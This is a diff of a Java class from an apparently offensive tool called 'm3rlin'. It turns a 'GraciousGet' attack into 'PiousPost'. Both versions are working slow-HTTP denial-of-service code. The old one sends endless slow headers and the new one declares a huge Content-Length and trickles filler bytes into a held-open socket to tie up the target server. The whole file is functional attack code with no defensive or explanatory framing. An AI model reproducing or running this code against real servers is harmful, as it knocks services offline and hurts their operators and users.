@@ -1,4 +1,4 @@
-package m3rlin.g3t;
+package m3rlin.p0st;
 
 import java.io.BufferedWriter;
 import java.io.IOException;
@@ -12,9 +12,9 @@ import java.net.UnknownHostException;
 import m3rlin.Attack;
 import m3rlin.utils.Logger;
 
-public class GraciousGet extends Attack {
-
-	public GraciousGet(String hostname, int port, int interval) {
+public class PiousPost extends Attack {
+	
+	public PiousPost(String hostname, int port, int interval) {
 		super(hostname, port, interval);		
 	}
 	
@@ -25,21 +25,19 @@ public class GraciousGet extends Attack {
 			writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"));
 			Logger.info(Thread.currentThread().getName() + " - start (" + name + ")");
 			while(isRunning && !isInterrupted()) {
-				writer.write("GET / HTTP/1.1\r\n");
+				writer.write("POST / HTTP/1.1\r\n");
 				writer.write("Host: " + hostname + " \r\n");
-				writer.write("User-agent:Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
+				writer.write("User-agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
 				writer.write("Content-Length: 1000000\r\n");
-				writer.write("Connection: Keep-Alive\r\n");
-				writer.write("X-a:\r\n");
+				writer.write("Connection:close\r\n");
+				writer.write("\r\n");
 				writer.flush();
 				for (int i = 0; i < 100000000; i++) {
-					writer.write("X-a: h4x0r\r\n");
+					writer.write("h4x0r|h4x0r|h4x0r|h4x0r");
 					writer.flush();
 					try {
 						Thread.sleep(interval);
-					} catch (InterruptedException e) {
-						Logger.error("Thread can't sleep");
-					}
+					} catch (InterruptedException e) { }
 				}
 			}
 		} catch (UnknownHostException e) {
